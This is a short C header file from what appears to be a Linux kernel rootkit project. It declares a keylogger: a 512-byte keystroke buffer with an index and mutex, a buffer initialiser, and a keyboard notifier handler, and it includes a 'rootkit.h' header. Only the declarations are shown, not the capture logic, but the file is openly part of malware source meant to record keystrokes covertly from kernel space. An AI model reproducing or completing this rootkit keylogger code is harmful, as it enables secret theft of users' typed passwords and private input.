#ifndef KEYLOGGER_HEADER
#define KEYLOGGER_HEADER

#include <linux/module.h>
#include <linux/notifier.h>
#include <linux/keyboard.h>

#include "debug.h"
#include "rootkit.h"


#define KEYLOGGER_SIZE 512
extern char keylogger[KEYLOGGER_SIZE];
extern size_t logger_index;
extern struct mutex keylogger_mutex;

void init_keylogger_buffer(void);

int keylogger_handler(struct notifier_block* nb, unsigned long action, void* data);



#endif